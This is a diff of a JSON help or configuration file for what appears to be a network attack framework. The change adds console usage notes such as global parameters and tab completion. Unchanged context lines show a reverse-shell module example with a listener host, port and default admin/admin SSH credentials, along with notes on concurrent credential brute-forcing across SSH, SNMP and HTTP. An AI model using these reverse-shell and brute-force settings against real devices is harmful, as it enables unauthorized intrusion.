@@ -148,6 +148,15 @@
         "desc": "Reverse shell (auto-deliver via SSH if creds available)",
         "cmd": "{\"target\":\"192.168.1.1\",\"params\":{\"mode\":\"shell\",\"lhost\":\"10.10.10.10\",\"lport\":\"4444\",\"ssh_user\":\"admin\",\"ssh_pass\":\"admin\"}}"
       }
+    ],
+    "notes": [
+      "[v2.4.3] setg <param> <value> - sets a global parameter that persists across all module switches and back/use commands",
+      "[v2.4.3] unsetg <param> - clears a global parameter",
+      "[v2.4.3] show global - shows all currently set global parameters",
+      "[v2.4.3] Bare run (no target) reuses the last target automatically",
+      "[v2.4.3] options - shortcut for show options | modules - shortcut for show modules",
+      "[v2.4.3] Tab after set shows all parameter names for the loaded module",
+      "[v2.4.3] Fish-style shell: predicted next command shown above prompt, Ctrl+F to accept suggestion"
     ]
   },
   "inputs": {
@@ -215,8 +224,8 @@
     "SSH credential testing requires paramiko: pip3 install paramiko",
     "HTTP checks require requests: pip3 install requests",
     "SNMP brute-force uses raw UDP without external tools",
-    "UPnP check uses UDP SSDP M-SEARCH \u2014 no nmap required",
+    "UPnP check uses UDP SSDP M-SEARCH — no nmap required",
     "All attacks are concurrent via ThreadPoolExecutor",
-    "Stop-on-success per service \u2014 stops trying creds once valid pair found"
+    "Stop-on-success per service — stops trying creds once valid pair found"
   ]
 }
